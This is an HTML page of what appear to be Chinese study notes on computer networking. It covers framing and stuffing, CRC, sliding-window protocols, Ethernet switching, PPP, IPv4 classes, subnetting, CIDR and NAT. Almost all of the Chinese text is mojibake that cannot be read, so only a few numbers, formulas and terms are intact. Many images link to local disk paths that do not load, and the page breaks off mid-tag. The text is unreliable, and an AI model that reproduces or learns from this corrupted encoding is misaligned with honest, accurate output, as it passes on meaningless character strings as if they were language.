å¸§é¦–éƒ¨å’Œå¸§å°¾éƒ¨ï¼šå¸§å®šç•Œç¬¦ï¼Œä¸ºäº†åŒºåˆ†æ¯”ç‰¹æµä¸­çš„å¸§</p></li><li><p>åŒºåˆ†è½½è·ä¸­çš„æ•°æ®ä¸å¸§å®šç•Œç¬¦å’Œæ§åˆ¶ç¬¦ï¼šESCï¼ˆæ§åˆ¶ç¬¦ï¼‰+FLAGï¼ˆå¸§å®šç•Œç¬¦ï¼‰</p><img src="E:\typora img\image-20220924133355678.png" alt="image-20220924133355678" style="zoom:50%;" /><blockquote><p>å­—ç¬¦å¡«å……æ³•ï¼šåœ¨å­—ç¬¦å‰åŠ ä¸Šè½¬ä¹‰å­—ç¬¦ESCï¼ˆ11100000ï¼‰</p><p>é›¶æ¯”ç‰¹å¡«å……æ³•ï¼šæ¯äº”ä¸ªè¿ç»­æ¯”ç‰¹1åé¢æ’å…¥ä¸€ä¸ªæ¯”ç‰¹0</p></blockquote></li></ul></li><li><p>å·®é”™æ§åˆ¶</p><p>ç›®çš„ï¼šä¸ºäº†æ£€æµ‹æ¯”ç‰¹åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦äº§ç”Ÿè¯¯ç ï¼ˆæ¯”ç‰¹å·®é”™ï¼‰ã€‚</p><p>å¦‚ä½•æ£€æµ‹ï¼š</p><ul><li>å¥‡å¶æ ¡éªŒ</li></ul><img src="E:\typora img\image-20221121104553471.png" alt="image-20221121104553471" style="zoom: 80%;" /><ul><li><p>CRCï¼ˆå¾ªç¯å†—ä½™æ ¡éªŒï¼‰</p><img src="E:\typora img\image-20220924135839068.png" alt="image-20220924135839068" style="zoom: 80%;" /><img src="E:\typora img\image-20220924135854287.png" alt="image-20220924135854287" style="zoom: 80%;" /></li></ul></li><li><p>å¯é ä¼ è¾“</p><blockquote><p>ä¿è¯æ¥æ”¶æ–¹èƒ½å¤Ÿæ­£ç¡®æ”¶åˆ°å‘é€æ–¹å‘é€çš„æ‰€æœ‰æ•°æ®ã€‚Â·</p></blockquote><ul><li><p>ä¼ è¾“ä¸­å‡ºç°çš„å·®é”™</p><ul><li><p>è¯¯ç ï¼šæ¯”ç‰¹é”™è¯¯ã€‚</p></li><li><p>ä¸¢å¤±ï¼šè·¯ç”±å™¨çš„è¾“å…¥é˜Ÿåˆ—æ»¡æ—¶ï¼Œä¼šä¸»åŠ¨ä¸¢å¼ƒæ•°æ®åˆ†ç»„ï¼Œäº¦æˆ–æ˜¯æ¥æ”¶æ–¹æ”¶åˆ°äº†é‡å¤çš„æ•°æ®åˆ†ç»„æ—¶ã€‚</p></li><li><p>ä¹±åºï¼šæ•°æ®åˆ†ç»„é€šè¿‡ä¸åŒçš„è·¯ç”±è·¯å¾„ï¼Œå¯¼è‡´åˆ°è¾¾æ¥æ”¶æ–¹çš„æ—¶é—´ä¸åŒã€‚</p></li><li><p>é‡å¤ï¼šæ•°æ®åˆ†ç»„é€šè¿‡çš„è·¯ç”±è·¯å¾„å µå¡ï¼Œå¯¼è‡´å‘é€æ–¹æ²¡æœ‰åŠæ—¶æ”¶åˆ°ç¡®è®¤åˆ†ç»„ï¼Œäº¦æˆ–æ˜¯ç¡®è®¤åˆ†ç»„åœ¨ä¼ è¾“çš„è¿‡ç¨‹</p><p>ä¸­ä¸¢å¤±ï¼Œå‘é€æ–¹å°±ä¼šè¶…æ—¶é‡å‘ã€‚</p></li></ul></li><li><p>æœºåˆ¶</p><ul><li>å¦è®¤æœºåˆ¶ï¼šå½“æ¥æ”¶æ–¹æ”¶åˆ°æ•°æ®å¹¶è¿›è¡Œå·®é”™æ£€æµ‹åï¼Œå¦‚æœå‘ç°å‡ºç°æ•°æ®è¯¯ç ï¼Œå°±å‘å‘é€æ–¹å‘é€å¦è®¤åˆ†ç»„ï¼Œä»¥è®©å‘é€æ–¹é‡å‘æ•°æ®ã€‚</li></ul></li><li><p>è¶…æ—¶é‡å‘æœºåˆ¶ï¼šå‘é€æ–¹å‘é€æ•°æ®åï¼Œå°±å¼€å§‹è®¡æ—¶RTOï¼Œå¦‚æœè¶…è¿‡RTOæ—¶é—´è¿˜æ²¡æœ‰æ¥æ”¶åˆ°ç¡®è®¤&#x2F;å¦è®¤åˆ†ç»„ï¼Œå°±è‡ªåŠ¨é‡å‘å¯¹åº”çš„æ•°æ®åˆ†ç»„ã€‚</p><ul><li>æ»‘åŠ¨çª—å£æœºåˆ¶ï¼šå‘é€çª—å£å’Œæ¥æ”¶çª—å£çš„å¤§å°å†³å®šäº†ä¸€æ¬¡èƒ½å¤Ÿå‘é€æˆ–æ¥æ”¶æ•°æ®åˆ†ç»„çš„æœ€å¤§æ•°é‡ï¼Œå¹¶ä¸”åªæœ‰æˆåŠŸå‘é€æˆ–æ¥æ”¶çª—å£å¤§å°çš„æ•°æ®åˆ†ç»„ï¼Œæ‰èƒ½å¤Ÿæ»‘åŠ¨çª—å£ï¼Œå³æ‰èƒ½å¤Ÿå‘é€æˆ–æ¥æ”¶ä¸‹ä¸€æ¬¡çš„æ•°æ®åˆ†ç»„ã€‚</li></ul></li></ul></li><li><p>ä¼ è¾“åè®®</p><ul><li><p>åœæ­¢-ç­‰å¾…ä¼ è¾“åè®®</p><blockquote><p>ä½¿ç”¨è¶…æ—¶é‡å‘æœºåˆ¶ï¼Œæ¯æ¬¡åªå‘é€ä¸€ä¸ªæ•°æ®åˆ†ç»„ã€‚</p></blockquote></li></ul><blockquote></blockquote><pre><code>&gt; å¹¶ä½¿ç”¨1bitæ¥æ ‡è®°åˆ†ç»„åºå·æ¥é˜²æ­¢æ•°æ®é‡å¤å·®é”™ã€‚&lt;img src=&quot;E:\typora img\image-20220924135602244.png&quot; alt=&quot;image-20220924135602244&quot; style=&quot;zoom: 67%;&quot; /&gt;</code></pre><ul><li><p>å›é€€Nå¸§åè®®</p><blockquote><p>ä½¿ç”¨æ»‘åŠ¨çª—å£æœºåˆ¶ã€‚</p></blockquote></li></ul><blockquote></blockquote><pre><code>&gt; å‘é€æ–¹å‘é€æ•°æ®åˆ†ç»„çš„ä¸ªæ•°å–å†³äºå‘é€çª—å£çš„å¤§å°ã€‚&gt;&gt; æ¥æ”¶æ–¹æ¥æ”¶æ•°æ®åˆ†ç»„çš„ä¸ªæ•°é»˜è®¤ä¸º1ï¼Œå³æ¥æ”¶çª—å£çš„å¤§å°é»˜è®¤ä¸º1ã€‚&gt;&gt; å‡è®¾ä¼ è¾“æ•°æ®0ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œæ•°æ®åˆ†ç»„2å‡ºé”™ï¼Œ&gt;&gt; é‚£ä¹ˆå‘é€æ–¹å°±è¦å›é€€åˆ°ç¬¬2å¸§ï¼Œé‡æ–°å‘é€æ•°æ®åˆ†ç»„2ï¼Œ3ï¼Œ4ã€‚</code></pre><ul><li><p>é€‰æ‹©é‡ä¼ åè®®</p><blockquote><p>ä½¿ç”¨æ»‘åŠ¨çª—å£æœºåˆ¶ã€‚</p></blockquote></li></ul><blockquote></blockquote><pre><code>&gt; å‘é€çª—å£å’Œæ¥æ”¶çª—å£å¤§å°ä¸€è‡´ã€‚&gt;&gt; å‡è®¾ä¼ è¾“æ•°æ®0ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œæ•°æ®åˆ†ç»„2å‡ºé”™ï¼Œ&gt;&gt; é‚£ä¹ˆå‘é€æ–¹åªéœ€è¦é‡æ–°å‘é€æ•°æ®åˆ†ç»„2ã€‚</code></pre><p>â€‹</p></li></ul><h3 id="ä»¥å¤ªç½‘"><a href="#ä»¥å¤ªç½‘" class="headerlink" title="ä»¥å¤ªç½‘"></a>ä»¥å¤ªç½‘</h3><h5 id="é›†çº¿å™¨å…±äº«å¼ä»¥å¤ªç½‘"><a href="#é›†çº¿å™¨å…±äº«å¼ä»¥å¤ªç½‘" class="headerlink" title="é›†çº¿å™¨å…±äº«å¼ä»¥å¤ªç½‘"></a>é›†çº¿å™¨å…±äº«å¼ä»¥å¤ªç½‘</h5><img src="E:\typora img\image-20221121125017133.png" alt="image-20221121125017133" style="zoom: 67%;" /><img src="E:\typora img\image-20221121125038156.png" alt="image-20221121125038156" style="zoom:67%;" /><h5 id="äº¤æ¢æœºäº¤æ¢å¼ä»¥å¤ªç½‘"><a href="#äº¤æ¢æœºäº¤æ¢å¼ä»¥å¤ªç½‘" class="headerlink" title="äº¤æ¢æœºäº¤æ¢å¼ä»¥å¤ªç½‘"></a>äº¤æ¢æœºäº¤æ¢å¼ä»¥å¤ªç½‘</h5><blockquote><p>äº¤æ¢æœºè‡ªå­¦ä¹ </p><p>Aâ†’B</p><p>ä»Aå‘å‡ºçš„å¸§åˆ°è¾¾äº¤æ¢æœºåï¼Œäº¤æ¢è®°å½•ä¸‹è¯¥å¸§çš„æºMACåœ°å€å³ä¸»æœºAçš„MACåœ°å€å’Œå¸§åˆ°è¾¾çš„äº¤æ¢æœºæ¥å£ï¼Œå¹¶åœ¨äº¤æ¢æœºçš„è®°å½•è¡¨ä¸­æŸ¥æ‰¾å¸§ä¸­çš„ç›®çš„MACåœ°å€ï¼Œä»è€Œç²¾ç¡®è½¬å‘æˆ–è€…ç›²ç›®è½¬å‘ã€‚</p></blockquote><img src="E:\typora img\image-20221121123350885.png" alt="image-20221121123350885" style="zoom: 67%;" /><img src="E:\typora img\image-20221121123637951.png" alt="image-20221121123637951" style="zoom: 67%;" /><img src="E:\typora img\image-20221121124516325.png" alt="image-20221121124516325" style="zoom: 67%;" /><h5 id="é›†çº¿å™¨ï¼Œäº¤æ¢æœºä¸å¸¦å®½"><a href="#é›†çº¿å™¨ï¼Œäº¤æ¢æœºä¸å¸¦å®½" class="headerlink" title="é›†çº¿å™¨ï¼Œäº¤æ¢æœºä¸å¸¦å®½"></a>é›†çº¿å™¨ï¼Œäº¤æ¢æœºä¸å¸¦å®½</h5><p><a href="https://blog.csdn.net/grady1234/article/details/44804423">https://blog.csdn.net/grady1234/article/details/44804423</a></p><blockquote><p>é›†çº¿å™¨æ˜¯â€å…±äº«æ€»çº¿â€œï¼Œåªæœ‰ä¸€æ¡è½¦é“ï¼Œä¸€èˆ¬æ˜¯å„ä¸»æœºå¹³åˆ†å¸¦å®½ã€‚</p><p>äº¤æ¢æœºæ˜¯ä¸€æ¡å…¬è·¯ï¼Œæœ‰Næ¡è½¦é“ï¼ˆå–å†³äºäº¤æ¢æœºçš„ç«¯å£æ•°é‡ï¼‰ï¼Œæ‰€ä»¥å„ä¸»æœºæ˜¯ç‹¬äº«å¸¦å®½ã€‚</p><p>ä½†æ˜¯å½“åªæœ‰ä¸€ä¸ªè½¦é“æ˜¯å¯ä»¥è®¿é—®å¤–ç½‘æ—¶ï¼Œè®¿é—®å¤–ç½‘æ—¶åˆä¼šå˜ä¸ºå„ä¸»æœºå¹³åˆ†å¸¦å®½ã€‚</p></blockquote><h3 id="PPPâ€“å®½å¸¦è¿æ¥"><a href="#PPPâ€“å®½å¸¦è¿æ¥" class="headerlink" title="PPPâ€“å®½å¸¦è¿æ¥"></a>PPPâ€“å®½å¸¦è¿æ¥</h3><h4 id="å¸§æ ¼å¼"><a href="#å¸§æ ¼å¼" class="headerlink" title="å¸§æ ¼å¼"></a>å¸§æ ¼å¼</h4><img src="E:\typora img\image-20221123142507857.png" alt="image-20221123142507857" style="zoom: 80%;" /><h4 id="é€æ˜ä¼ è¾“"><a href="#é€æ˜ä¼ è¾“" class="headerlink" title="é€æ˜ä¼ è¾“"></a>é€æ˜ä¼ è¾“</h4><img src="E:\typora img\image-20221123143056117.png" alt="image-20221123143056117" style="zoom:80%;" /><img src="E:\typora img\image-20221123143136837.png" alt="image-20221123143136837" style="zoom:80%;" /><p>PPPåè®®çš„ä¸»è¦ç‰¹ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆPPPä¸ä½¿ç”¨å¸§çš„ç¼–å·ï¼ŸPPPé€‚ç”¨äºä»€ä¹ˆæƒ…å†µï¼Ÿä¸ºä»€ä¹ˆPPPåè®®ä¸èƒ½ä½¿æ•°æ®é“¾è·¯å±‚å®ç°å¯é ä¼ è¾“ï¼Ÿ</p><blockquote><p>ç­”ï¼š</p><p>ç®€å•ï¼Œæä¾›ä¸å¯é çš„æ•°æ®æŠ¥æœåŠ¡ï¼Œæ£€é”™ï¼Œæ— çº é”™;</p><p>PPPä¸é‡‡ç”¨åºå·å’Œç¡®è®¤æœºåˆ¶æ˜¯å‡ºäºä»¥ä¸‹çš„è€ƒè™‘ï¼š</p><p>ç¬¬ä¸€ï¼Œ è‹¥ä½¿ç”¨èƒ½å¤Ÿå®ç°å¯é ä¼ è¾“çš„æ•°æ®é“¾è·¯å±‚åè®®ï¼Œå¼€é”€å°±è¦å¢å¤§ã€‚åœ¨æ•°æ®é“¾è·¯å±‚å‡ºç°å·®é”™çš„æ¦‚ç‡ä¸å¤§æ—¶ï¼Œä½¿ç”¨æ¯”è¾ƒç®€å•çš„PPPåè®®è¾ƒä¸ºåˆç†ã€‚</p><p>ç¬¬äºŒï¼Œæ•°æ®é“¾è·¯å±‚çš„å¯é ä¼ è¾“å¹¶ä¸èƒ½ä¿è¯ç½‘ç»œå±‚çš„ä¼ è¾“ä¹Ÿæ˜¯å¯é çš„ã€‚</p><p>ç¬¬ä¸‰ï¼Œ PPPåè®®æœ‰å¸§æ£€éªŒåºåˆ—FCSå­—æ®µï¼Œå¯ä»¥æ£€é”™ï¼Œæ‰€ä»¥å¯ä»¥ä¿è¯æ— å·®é”™æ¥å—ã€‚</p><p>PPPé€‚ç”¨äºç‚¹åˆ°ç‚¹çº¿è·¯å¹¶ä¸”çº¿è·¯è´¨é‡ä¸å·®çš„ä¼ è¾“ä¸­ï¼Œä¾‹å¦‚ç”¨æˆ·æ‹¨å·è¿æ¥ä¸Šç½‘ã€‚</p><p>å› ä¸ºPPPä¸ä½¿ç”¨åºå·å’Œç¡®è®¤æœºåˆ¶ï¼Œæ‰€ä»¥æ— æ³•å®ç°å¯é ä¼ è¾“ã€‚</p></blockquote><h2 id="ç¬¬å››ç« "><a href="#ç¬¬å››ç« " class="headerlink" title="ç¬¬å››ç« "></a>ç¬¬å››ç« </h2><p>ç½‘ç»œæ•°é‡&#x3D;2^ç½‘ç»œå·</p><p>å¯åˆ†é…åœ°å€&#x3D;2^ä¸»æœºå·-2</p><h3 id="åˆ†ç±»ç¼–å€"><a href="#åˆ†ç±»ç¼–å€" class="headerlink" title="åˆ†ç±»ç¼–å€"></a>åˆ†ç±»ç¼–å€</h3><p>IPåœ°å€&#x3D;ç½‘ç»œå·+ä¸»æœºå·</p><p>å¯åˆ†é…ç»™ä¸»æœºçš„åœ°å€&#x3D;2^x-2  ï¼ˆxä¸ºä¸»æœºå·ä½æ•°ï¼›-2ï¼šç½‘ç»œåœ°å€+å¹¿æ’­åœ°å€ï¼‰</p><img src="E:\typora img\image-20220929214342955.png" alt="image-20220929214342955" style="zoom: 67%;" /><ul><li><p>Aç±»åœ°å€</p><img src="E:\typora img\image-20220929214835663.png" alt="image-20220929214835663" style="zoom:67%;" /><p>â€‹æœ¬åœ°ç¯å›åœ°å€ï¼šé€šå¸¸æ˜¯æŒ‡127.0.0.1ï¼Œä¸å±äºä»»ä½•ä¸€ä¸ªæœ‰ç±»åˆ«åœ°å€ç±»ã€‚ä¸€èˆ¬éƒ½ä¼šç”¨æ¥æ£€æŸ¥æœ¬åœ°ç½‘ç»œåè®®ã€åŸºæœ¬æ•°æ®æ¥ å£ç­‰æ˜¯å¦æ­£å¸¸çš„ã€‚</p><p>â€‹<a href="https://blog.csdn.net/u010783226/article/details/119382949">æœ¬åœ°ç¯å›åœ°å€è¯¦è§£åŠä¸localhostï¼Œ0.0.0.0åŒºåˆ«</a></p><blockquote><p>æ€»ç»“</p><ul><li><p>127.0.0.1 æ˜¯å›ç¯åœ°å€ã€‚localhostæ˜¯åŸŸåï¼Œä½†é»˜è®¤ç­‰äº 127.0.0.1ã€‚</p></li><li><p>ping å›ç¯åœ°å€å’Œ ping æœ¬æœºåœ°å€ï¼Œæ˜¯ä¸€æ ·çš„ï¼Œèµ°çš„æ˜¯lo0 â€œå‡ç½‘å¡â€ï¼Œéƒ½ä¼šç»è¿‡ç½‘ç»œå±‚å’Œæ•°æ®é“¾è·¯å±‚ç­‰é€»è¾‘ï¼Œæœ€ååœ¨å¿«è¦å‡ºç½‘å¡å‰ç‹ ç‹ æ‹äº†ä¸ªå¼¯ï¼Œ å°†æ•°æ®æ’å…¥åˆ°ä¸€ä¸ªé“¾è¡¨åå°±è½¯ä¸­æ–­é€šçŸ¥ ksoftirqd æ¥è¿›è¡Œæ”¶æ•°æ®çš„é€»è¾‘ï¼Œå‹æ ¹å°±ä¸å‡ºç½‘ç»œã€‚æ‰€ä»¥æ–­ç½‘äº†ä¹Ÿèƒ½ ping é€šå›ç¯åœ°å€ã€‚</p></li><li><p>å¦‚æœæœåŠ¡å™¨ listen çš„æ˜¯ 0.0.0.0ï¼Œé‚£ä¹ˆæ­¤æ—¶ç”¨127.0.0.1å’Œæœ¬æœºåœ°å€éƒ½å¯ä»¥è®¿é—®åˆ°æœåŠ¡ã€‚ã€</p></li></ul></blockquote></li><li><p>Bç±»åœ°å€</p><img src="E:\typora img\image-20220929220023850.png" alt="image-20220929220023850" style="zoom:67%;" /></li><li><p>Cç±»åœ°å€</p><img src="E:\typora img\image-20220929220352145.png" alt="image-20220929220352145" style="zoom:67%;" /></li><li><p>Dç±»å’ŒEç±»</p><p>![image-20220929220439484](E:\typora img\image-20220929220439484.png)</p></li></ul><h4 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><p>![image-20220929220652096](E:\typora img\image-20220929220652096.png)</p><h4 id="ç‰¹æ®Šipv4åœ°å€"><a href="#ç‰¹æ®Šipv4åœ°å€" class="headerlink" title="ç‰¹æ®Šipv4åœ°å€"></a>ç‰¹æ®Šipv4åœ°å€</h4><img src="E:\typora img\image-20220929220724192.png" alt="image-20220929220724192" style="zoom: 67%;" /><h3 id="åˆ’åˆ†å­ç½‘"><a href="#åˆ’åˆ†å­ç½‘" class="headerlink" title="åˆ’åˆ†å­ç½‘"></a>åˆ’åˆ†å­ç½‘</h3><p>IPåœ°å€&#x3D;ç½‘ç»œå·+å­ç½‘å·+ä¸»æœºå·</p><p>ç½‘ç»œåœ°å€&#x3D;ç½‘ç»œå·+å­ç½‘å·</p><p>ç½‘ç»œåœ°å€&#x3D;IPåœ°å€&amp;å­ç½‘æ©ç ï¼ˆå› ä¸ºå­ç½‘æ©ç çš„ä¸»æœºå·å…¨0ï¼Œæ‰€ä»¥&amp;è¿ç®—åçš„ç»“æœåªä¿ç•™äº†ç½‘ç»œå·å’Œå­ç½‘å·ã€‚ï¼‰</p><h4 id="ç”±æ¥"><a href="#ç”±æ¥" class="headerlink" title="ç”±æ¥"></a>ç”±æ¥</h4><p>å½“å±€åŸŸç½‘ä»åªæœ‰ä¸€ä¸ªå­ç½‘1åˆ°æ‹¥æœ‰ä¸‰ä¸ªå­ç½‘æ—¶ï¼š</p><img src="E:\typora img\image-20220929222609025.png" alt="image-20220929222609025" style="zoom:50%;" /><p>é€šè¿‡å€ŸåŠ©ä¸»æœºå·çš„æ¯”ç‰¹æ¥åŒºåˆ†å­ç½‘ã€‚</p><p>ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¦‚ä½•çŸ¥é“ä¸»æœºå·ä¸­çš„å“ªäº›æ¯”ç‰¹æ˜¯ç”¨æ¥åŒºåˆ†å­ç½‘çš„ï¼Ÿ</p><p>æ‰€ä»¥å‡ºç°äº†å­ç½‘æ©ç </p><p>æ³¨ï¼šè¿™æ—¶å€™çš„</p><img src="E:\typora img\image-20220929223227955.png" alt="image-20220929223227955" style="zoom:67%;" /><p>â€‹</p><p>â€‹</p><h4 id="ä¾‹å­-1"><a href="#ä¾‹å­-1" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><img src="E:\typora img\image-20220929223627374.png" alt="image-20220929223627374" style="zoom:67%;" /><img src="E:\typora img\image-20220929223854504.png" alt="image-20220929223854504" style="zoom:67%;" /><p>â€‹åˆ’åˆ†å‡ºçš„å­ç½‘æ•°é‡ä¸º2^1&#x3D;2ä¸ª ï¼ˆ1ä¸ºå­ç½‘å·ä½æ•°ï¼‰</p><h3 id="æ— åˆ†ç±»ç¼–å€â€“CIDR"><a href="#æ— åˆ†ç±»ç¼–å€â€“CIDR" class="headerlink" title="æ— åˆ†ç±»ç¼–å€â€“CIDR"></a>æ— åˆ†ç±»ç¼–å€â€“CIDR</h3><h4 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h4><img src="E:\typora img\image-20220930101726406.png" alt="image-20220930101726406" style="zoom:50%;" /><h4 id="æ–œçº¿è®°æ³•"><a href="#æ–œçº¿è®°æ³•" class="headerlink" title="æ–œçº¿è®°æ³•"></a>æ–œçº¿è®°æ³•</h4><img src="E:\typora img\image-20220930101653789.png" alt="image-20220930101653789" style="zoom: 50%;" /><h4 id="æ˜Ÿå·è®°æ³•"><a href="#æ˜Ÿå·è®°æ³•" class="headerlink" title="æ˜Ÿå·è®°æ³•"></a>æ˜Ÿå·è®°æ³•</h4><p>â€‹ç½‘ç»œå‰ç¼€çš„åé¢åŠ ä¸€ä¸ªæ˜Ÿå· * çš„è¡¨ç¤ºæ–¹æ³•ï¼Œå¦‚00001010 00*ï¼Œåœ¨æ˜Ÿå· * ä¹‹å‰æ˜¯ç½‘ç»œå‰ç¼€ï¼Œè€Œæ˜Ÿå· * è¡¨ç¤º IP åœ°å€ä¸­çš„ä¸»æœºå·ï¼Œå¯ä»¥æ˜¯ä»»æ„å€¼ã€‚</p><h4 id="å¥½å¤„"><a href="#å¥½å¤„" class="headerlink" title="å¥½å¤„"></a>å¥½å¤„</h4><p>â€‹<img src="E:\typora img\image-20220930102420468.png" alt="image-20220930102420468" style="zoom: 67%;" /></p><p>â€‹åŠ¨æ€åˆ†é…åœ°å€ï¼Œæœ‰æ•ˆåˆ©ç”¨ipv4åœ°å€</p><blockquote><p>â€‹      åˆ†é…ç½‘ç»œå‰ç¼€æ—¶åº”å…ˆåˆ†é…åœ°å€æ•°è¾ƒå¤šçš„å‰ç¼€ã€‚</p></blockquote><p>â€‹<img src="E:\typora img\image-20220930102439160.png" alt="image-20220930102439160" style="zoom:80%;" /></p><p>â€‹å‡å°‘è·¯ç”±ä¿¡æ¯æ‰€å çš„ç½‘ç»œèµ„æºï¼ŒåŸæœ¬éœ€è¦è®°å½•5ä¸ªè·¯ç”±ä¿¡æ¯ï¼Œä½¿ç”¨æ— åˆ†ç±»ç¼–å€åªéœ€è¦è®°å½•å…¶å…±åŒå‰ç¼€ä½œä¸ºç½‘ç»œåœ°å€å³å¯å¾—åˆ°èšåˆåœ°å€å—ã€‚</p><h4 id="å­ç½‘åˆ’åˆ†"><a href="#å­ç½‘åˆ’åˆ†" class="headerlink" title="å­ç½‘åˆ’åˆ†"></a>å­ç½‘åˆ’åˆ†</h4><ul><li><p>å®šé•¿å­ç½‘æ©ç </p><img src="E:\typora img\image-20221001151101365.png" alt="image-20221001151101365" style="zoom: 50%;" /></li><li><p>ä¸å®šé•¿å­ç½‘æ©ç </p><p>å…ˆæ ¹æ®ä¸»æœºæ•°é‡+ç½‘ç»œè®¾å¤‡æ•°é‡ç¡®å®šå‡ºä¸»æœºå·ï¼Œä»è€Œç¡®ç«‹å‡ºå­ç½‘æ©ç ã€‚</p></li></ul><h3 id="ipåœ°å€ä¸macåœ°å€"><a href="#ipåœ°å€ä¸macåœ°å€" class="headerlink" title="ipåœ°å€ä¸macåœ°å€"></a>ipåœ°å€ä¸macåœ°å€</h3><img src="E:\typora img\image-20221025104225445.png" alt="image-20221025104225445" style="zoom: 80%;" /><p>ä¸ºä»€ä¹ˆéœ€è¦ä¸¤ä¸ªåœ°å€ï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªåœ°å€å¯ä»¥å—ï¼Ÿ</p><p>ä¸å¯ä»¥ã€‚å› ä¸ºå¦‚æœåªæœ‰macåœ°å€ï¼Œé‚£ä¹ˆè·¯ç”±å™¨å°±éœ€è¦è®°å½•æ‰€æœ‰ä¸»æœºçš„macåœ°å€ï¼Œè¿™éœ€è¦å·¨å¤§çš„è·¯ç”±å­˜å‚¨ç©ºé—´ä»¥åŠé€šä¿¡èµ„æºã€‚è€Œå¦‚æœåªæœ‰ipåœ°å€ï¼Œé‚£ä¹ˆæ•°æ®å°±ä¸èƒ½åˆ°è¾¾ç›®çš„ä¸»æœºï¼Œå› ä¸ºåªçŸ¥é“ä¸»æœºåœ¨å“ªä¸€ä¸ªç½‘ç»œç†é‡Œï¼Œè€Œä¸çŸ¥é“ä¸»æœºå…·ä½“åœ¨ç½‘ç»œçš„å“ªé‡Œï¼Œipåœ°å€å°±åƒå°åŒºå·ï¼Œmacåœ°å€å°±åƒé—¨ç‰Œå·ï¼ŒåªçŸ¥é“å°åŒºå·æ˜¯æ‰¾ä¸åˆ°å¯¹æ–¹çš„ã€‚</p><h3 id="ipæ•°æ®æŠ¥"><a href="#ipæ•°æ®æŠ¥" class="headerlink" title="ipæ•°æ®æŠ¥"></a>ipæ•°æ®æŠ¥</h3><h5 id="å‘é€è¿‡ç¨‹"><a href="#å‘é€è¿‡ç¨‹" class="headerlink" title="å‘é€è¿‡ç¨‹"></a>å‘é€è¿‡ç¨‹</h5><p>ä¸»æœºAå‘ä¸»æœºBå‘é€IPæ•°æ®åŒ…</p><ol><li><p>ä¸»æœºAéœ€è¦åˆ¤æ–­ä¸»æœºBä¸å…¶æ˜¯å¦åœ¨åŒä¸€ä¸ªç½‘ç»œä¸­ï¼Œè‹¥åœ¨åŒä¸€ä¸ªç½‘ç»œä¸­å¯ä»¥ç›´æ¥äº¤ä»˜ï¼Œè‹¥ä¸åœ¨åŒä¸€ä¸ªç½‘ç»œä¸­ï¼Œåˆ™éœ€è¦è·¯ç”±å™¨æ¥é—´æ¥äº¤ä»˜ã€‚</p></li><li><p>å‡è®¾æ˜¯é—´æ¥äº¤ä»˜ã€‚é‚£ä¹ˆä¸»æœºAè¯¥å°†IPæ•°æ®æŠ¥å‘ç»™å“ªä¸€ä¸ªè·¯ç”±å™¨å‘¢ï¼Ÿç­”æ¡ˆæ˜¯é»˜è®¤ç½‘å…³ï¼Œå³ç½‘ç»œç®¡ç†å‘˜è®¾ç½®çš„ä¸»æœºAæ‰€åœ¨ä»¥å¤ªç½‘ç”¨æ¥è½¬å‘çš„é»˜è®¤è·¯ç”±å™¨ã€‚</p></li><li><p>ä¸»æœºAå°†IPæ•°æ®æŠ¥è½¬å‘ç»™é»˜è®¤ç½‘å…³åï¼Œç½‘å…³ï¼ˆå³è·¯ç”±å™¨ï¼‰æ€ä¹ˆçŸ¥é“è¯¥è½¬å‘ç»™å“ªä¸ªä»¥å¤ªç½‘å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æ ¹æ®è·¯ç”±è¡¨ã€‚</p><p>![image-20221123194349859](E:\typora img\image-20221123194349859.png)</p><p>ç½‘å…³å°†IPæ•°æ®æŠ¥çš„ç›®æ ‡åœ°å€ï¼ˆå³ä¸»æœºBçš„IPåœ°å€ï¼‰ä¸è·¯ç”±è¡¨ä¸­çš„å­ç½‘æ©ç ç›¸ä¸åå¾—åˆ°ä¸»æœºBçš„ç½‘ç»œåœ°å€ï¼Œå†æŸ¥æ‰¾è·¯ç”±è¡¨ä¸­æ˜¯å¦æœ‰è¯¥ç›®çš„ç½‘ç»œï¼Œå¦‚æœæ‰¾åˆ°å°±æŒ‰ç…§ä¸‹ä¸€è·³å°†IPæ•°æ®æŠ¥è½¬å‘å‡ºå»ã€‚</p></li></ol><img src="E:\typora img\image-20221025114844358.png" alt="image-20221025114844358" style="zoom:80%;" /><h5 id="æ ¼å¼"><a href="#æ ¼å¼" class="headerlink" title="æ ¼å¼"></a>æ ¼å¼</h5><img src="E:\typora img\image-20221123193136721.png" alt="image-20221123193136721" style="zoom:80%;" /><img src="E:\typora img\image-20221123193048060.png" alt="image-20221123193048060" style="zoom:80%;" /><h3 id="VPNâ€“è™šæ‹Ÿä¸“ç”¨ç½‘"><a href="#VPNâ€“è™šæ‹Ÿä¸“ç”¨ç½‘" class="headerlink" title="VPNâ€“è™šæ‹Ÿä¸“ç”¨ç½‘"></a>VPNâ€“è™šæ‹Ÿä¸“ç”¨ç½‘</h3><img src="E:\typora img\image-20221123173248014.png" alt="image-20221123173248014" style="zoom: 80%;" /><h3 id="NATâ€“ç½‘ç»œåœ°å€è½¬æ¢"><a href="#NATâ€“ç½‘ç»œåœ°å€è½¬æ¢" class="headerlink" title="NATâ€“ç½‘ç»œåœ°å€è½¬æ¢"></a>NATâ€“ç½‘ç»œåœ°å€è½¬æ¢</h3><h5 id="å†…ç½‘è½¬å¤–ç½‘"><a href="#å†…ç½‘è½¬å¤–ç½‘" class="headerlink" title="å†…ç½‘è½¬å¤–ç½‘"></a>å†…ç½‘è½¬å¤–ç½‘</h5><img src="E:\typora img\image-20221123173626593.png" alt="image-20221123173626593" style="zoom:80%;" /><img src="E:\typora img\image-20221123173654820.png" alt="image-20221123173654820" style="zoom:80%;" /><h5 id="å†…ç½‘è½¬ç«¯å£"><a href="#å†…ç½‘è½¬ç«¯å£" class="headerlink" title="å†…ç½‘è½¬ç«¯å£"></a>å†…ç½‘è½¬ç«¯å£</h5><img src="E:\typora img\image-20221123174210026.png" alt="image-20221123174210026" style="zoom:80%;" /><h3 id="IPV6"><a href="#IPV6" class="headerlink" title="IPV6"></a>IPV6</h3><img 